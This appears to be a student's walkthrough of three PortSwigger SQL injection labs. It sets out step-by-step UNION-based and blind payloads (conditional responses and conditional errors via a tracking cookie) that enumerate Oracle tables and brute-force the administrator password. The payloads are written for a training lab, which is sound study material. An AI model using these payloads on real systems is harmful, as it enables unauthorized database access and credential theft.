# SQL Injection Part 3: Portswigger Labs
### [Lab 10: SQL injection attack, listing the database contents on Oracle](https://0a4000fb036fe53ec00903d500a80086.web-security-academy.net/filter?category=Lifestyle)
**To solve: Login as the administrator**

**STEP 1:**
Find number of columns 
```sql
' UNION SELECT null,null FROM DUAL--
```

**STEP 2:**
Find columns that contains text
```sql
' UNION SELECT 'a', 'a' from DUAL--
```

**STEP 3:**
Output the list of tables in the database 
```sql
' UNION SELECT table_name,null FROM all_tables--
```

**STEP 4:**
Output the column names of the users table
```sql
' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name = 'USERS_RANDOM'--
```

**STEP 5:**
Use the USERNAME_RANDOM and PASSWORD_RANDOM column and USERS_RANDOM table to get credentials
```sql
' UNION SELECT USERNAME_RANDOM,PASSWORD_RANDOM FROM USERS_RANDOM--
```

**STEP 6:**
Login

### [Lab 11: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

**To solve: Login as administrator**

**STEP 1**
Finding vulnerable parameter which here is tracking cookie
```html
trackingId = "xxxxxxxxxxxxx' and 1=0--
```

> If this tracking id exists -> query returns value -> Welcome back message

> If the tracking id doesn't exist -> query returns nothing > no welcome back message

**STEP 2:**
Confirm users table exist
```sql
trackingId = xxxxxxxxxxxxx' and (select 'x' from users LIMIT 1) = 'x'--
```

**STEP 3:**
Confirm that username administrator exists in users table
```sql
trackingId = 'xxxxxxxxxxxxx' and (select username from users where username='administrator') = 'administrator'--
```

**STEP 4:**
Enumerate the password length
```sql
trackingId = 'RVLfBu6s9EZRUVYN' and (select username from users where username = 'administrator' and LENGTH(password) > 1 ) = 'administrator'--
```

> we graually increase the length of password till we don't get welcome back message

> Till 19 character we get welcome back message -> password is exactly 20 character

**STEP 5:**
Enumerate the password
```sql
trackingId = 'RvLfBu6s9EZRLVYN' and (select substring(password,1,1) from users where username='administrator')='a'--
```

> substring divides the password -> This give us oppurunity to bruteforce each character at a time

**STEP 6:**
Login

### [Lab 12: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

**To solve:**
Login as administrator

**STEP 1**
Finding vulnerable parameter which here is tracking cookie
```sql
trackingId = "xxxxxxxxxxxxx' || (select '' FROM dual) ||'
```

> Using ***and*** operator gives error ->> database is oracle
>> trackingId = xxxxxxxxxxxxx' || (select '' FROM dual) ||' ->> No Error


**STEP 2:**
Confirm users table exist
```sql
trackingId = xxxxxxxxxxxxx' and (select 'x' from users LIMIT 1) = 'x'--
```

**STEP 3:**
Confirm that username administrator exists in users table
```sql
trackingId = xxxxxxxxxxxxx' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 
```
> 1 is not equal to 0 so ELSE statment is executed ->> No Error

```sql
trackingId = xxxxxxxxxxxxx' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```
> This syntax gave error ->> username administrator exist

**STEP 4:**
Determine the password length
```sql
trackingId = xxxxxxxxxxxxx' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>1) || '
```
> LENGTH(password) > 19 ) ->> Error

> LENGTH(password) > 20 ) ->> No Error
>> password is of exactly 20 character

**STEP 5:**
Enumerate the password
```sql
trackingId = xxxxxxxxxxxxx' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and substr(password,1,1)='a' || '
```
> Iteratively brute forcing each characters
>> substr(password,1,$1$)='$a$'

**STEP 6:**
Login




